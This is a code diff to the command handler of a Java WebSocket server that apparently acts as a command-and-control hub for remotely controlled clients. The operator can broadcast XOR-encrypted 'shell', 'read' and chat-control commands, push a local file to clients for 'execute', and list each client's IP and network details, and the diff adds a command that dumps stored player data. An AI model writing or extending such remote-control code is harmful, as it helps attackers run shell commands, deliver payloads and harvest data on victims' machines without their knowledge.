@@ -12,35 +12,29 @@ import java.util.Base64;
 import java.util.List;
 
 public class CommandHandler {
-    public static boolean encrypt = true;
     private static List<WebSocket> connCollection;
     private static boolean all = false;
 
     private void tryBroadcast(String message, Server server) {
-        if (encrypt) {
-            byte[] encrypted = Server.xor.encrypt(message);
-            if (all)
-                server.broadcast(encrypted);
-            else
-                server.broadcast(encrypted, connCollection);
-        } else if (all)
-            server.broadcast(message);
+        byte[] encrypted = Server.xor.encrypt(message);
+        if (all)
+            server.broadcast(encrypted);
         else
-            server.broadcast(message, connCollection);
+            server.broadcast(encrypted, connCollection);
     }
 
-
+    @SuppressWarnings("resource")
     public boolean handle(String in, Server server) {
         boolean stop = false;
         String[] msgArr = in.split(" ");
         if (msgArr.length > 0) {
             try {
                 switch (msgArr[0]) {
-                    case "stop":
+                    case "stop" -> {
                         server.stop();
                         stop = true;
-                        break;
-                    case "conn":
+                    }
+                    case "conn" -> {
                         if (msgArr.length == 1) {
                             Server.log("----CONNECTIONS----");
                             server.getConnections().forEach(conn -> {
@@ -56,6 +50,11 @@ public class CommandHandler {
                                                 conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                         .forEach(conn -> Server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
                                                 Server.clientMap.get(conn).getAsJsonObject("ip").toString()
+                                        )));
+                                case "player" -> server.getConnections().stream().filter(conn ->
+                                                conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
+                                        .forEach(conn -> Server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
+                                                Server.clientMap.get(conn).toString()
                                         )));
                                 case "sel" -> {
                                     connCollection = new ArrayList<>();
@@ -79,29 +78,23 @@ public class CommandHandler {
                                 }
                             }
                         }
-                        break;
-                    case "chat":
-                    case "chat_control":
-                    case "chat_filter":
-                    case "shell":
-                    case "read":
+                    }
+                    case "chat", "chat_control", "chat_filter", "shell", "read" -> {
                         if (msgArr.length < 2) break;
                         String[] strArr = new String[msgArr.length - 1];
                         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
                         tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(
                                 String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)), server);
-                        break;
-                    case "execute":
+                    }
+                    case "execute" -> {
                         if (msgArr.length < 2) break;
                         String[] strArr2 = new String[msgArr.length - 1];
                         System.arraycopy(msgArr, 1, strArr2, 0, strArr2.length);
                         File file = new File(String.join(" ", strArr2));
                         FileInputStream is = new FileInputStream(file);
                         tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(is.readAllBytes()), server);
-                        break;
-                    default:
-                        tryBroadcast(in, server);
-                        break;
+                    }
+                    default -> tryBroadcast(in, server);
                 }
             } catch (Exception e) {
                 e.printStackTrace();
